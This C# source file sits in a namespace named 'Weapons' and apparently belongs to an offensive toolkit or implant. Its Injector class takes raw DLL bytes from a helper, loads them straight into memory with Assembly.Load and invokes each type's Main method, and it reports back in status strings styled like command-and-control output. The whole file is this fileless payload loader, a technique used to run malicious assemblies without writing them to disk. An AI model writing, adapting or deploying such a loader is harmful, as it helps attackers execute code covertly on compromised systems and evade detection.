using System;
using System.IO;
using System.Reflection;
using System.Text;

namespace Weapons
{
    // In-Memory Injection
    class Injector
    {
        public static string Inject(string target)
        {
            byte[] bytes = W_Utils.GetDLLBytes(target);

            if (bytes.Length > 0)
            {
                var assembly = Assembly.Load(bytes);
                
                foreach (var type in assembly.GetTypes())
                {
                    object instance = Activator.CreateInstance(type);
                    object[] args = new object[] { new string[] { "" } };

                    try
                    {
                        type.GetMethod("Main").Invoke(instance, args);
                        return String.Format("[*] Loaded Type {0}", type);
                    }
                    catch { }
                }
                return "#!#Injection Failed";
            }
            return "#!#404 - File Not Found";
        }
    }
}
